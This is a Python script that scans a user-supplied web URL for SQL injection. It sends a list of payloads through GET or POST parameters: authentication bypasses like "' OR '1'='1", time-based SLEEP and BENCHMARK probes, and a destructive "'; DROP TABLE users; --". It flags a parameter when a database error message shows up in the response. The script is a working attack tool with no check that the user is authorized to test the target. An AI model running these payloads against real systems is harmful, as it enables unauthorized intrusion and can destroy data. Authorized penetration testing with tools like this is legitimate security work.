
"""
Simple SQL Injection Vulnerability Tester

This script tests a target web application URL for SQL injection vulnerabilities by injecting
common SQL payloads into a specified parameter and analyzing the responses for error messages or anomalies.

Usage:
    python sql_injection_tester.py

The script will prompt for:
 - Target URL (with a placeholder for the injectable parameter, e.g. http://example.com/item?id=)
 - Parameter name to inject
 - HTTP method (GET or POST)
"""

import requests # type: ignore # type: ignore\
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys

COMMON_SQL_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "admin'--",
    "'; DROP TABLE users; --",
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
]

SQL_ERROR_SIGNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax error",
    "mysql_fetch_array()",
    "pg_query()",
    "syntax error",
    "mysql_num_rows()",
    "db2_stmt_execute",
    "odbc_exec",
    "SQLSTATE",
]

def check_sql_errors(text):
    """Check if any SQL error signature is present in the response text."""
    text_lower = text.lower()
    for error_sign in SQL_ERROR_SIGNS:
        if error_sign in text_lower:
            return True
    return False

def test_get(url):
    print("\n[*] Testing GET parameter injection...\n")
    parsed = urlparse(url)

    # Parse query parameters
    query_params = parse_qs(parsed.query)
    if not query_params:
        print("[ERROR] No parameters found in the URL to test.")
        return

    for param in query_params:
        original_value = query_params[param][0] if query_params[param] else ""
        print(f"Testing parameter: {param}")

        vulnerable = False
        for payload in COMMON_SQL_PAYLOADS:
            # Inject payload
            query_params[param][0] = original_value + payload
            injected_query = urlencode(query_params, doseq=True)
            injected_url = urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, injected_query, parsed.fragment)
            )

            try:
                response = requests.get(injected_url, timeout=10)
                # Check for SQL errors or anomalies
                if check_sql_errors(response.text):
                    print(f"  [!] Potential SQL Injection detected with payload: {payload}")
                    print(f"      URL: {injected_url}\n")
                    vulnerable = True
                    break
            except requests.RequestException as e:
                print(f"  [ERROR] Request failed: {e}")
                return

        if not vulnerable:
            print(f"  [-] No SQL Injection detected on parameter: {param}\n")

def test_post(url):
    print("\n[*] Testing POST parameter injection...\n")
    # For simplicity, ask user for POST params
    post_params = {}
    print("Enter POST parameters (key=value), one per line. Enter blank line to finish:")
    while True:
        line = input()
        if not line.strip():
            break
        if '=' not in line:
            print("[WARN] Invalid input format, expected key=value.")
            continue
        key, value = line.split('=', 1)
        post_params[key.strip()] = value.strip()

    if not post_params:
        print("[ERROR] No POST parameters provided.")
        return

    for param in post_params.keys():
        original_value = post_params[param]
        print(f"Testing parameter: {param}")

        vulnerable = False
        for payload in COMMON_SQL_PAYLOADS:
            # Inject payload
            post_params[param] = original_value + payload
            try:
                response = requests.post(url, data=post_params, timeout=10)
                if check_sql_errors(response.text):
                    print(f"  [!] Potential SQL Injection detected with payload: {payload}")
                    print(f"      POST Data: {post_params}\n")
                    vulnerable = True
                    break
            except requests.RequestException as e:
                print(f"  [ERROR] Request failed: {e}")
                return
        # Reset parameter
        post_params[param] = original_value

        if not vulnerable:
            print(f"  [-] No SQL Injection detected on parameter: {param}\n")

def main():
    print("\n=== Simple SQL Injection Tester ===\n")
    target_url = input("Enter target URL (for GET testing, include complete URL with parameters): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Please enter a valid URL starting with http:// or https://")
        sys.exit(1)

    method = input("HTTP method to test (GET or POST): ").strip().upper()
    if method not in ("GET", "POST"):
        print("[ERROR] Unsupported HTTP method. Choose GET or POST.")
        sys.exit(1)

    if method == "GET":
        test_get(target_url)
    else:
        test_post(target_url)

    print("\n=== Test completed ===\n")

if __name__ == "__main__":
    main()

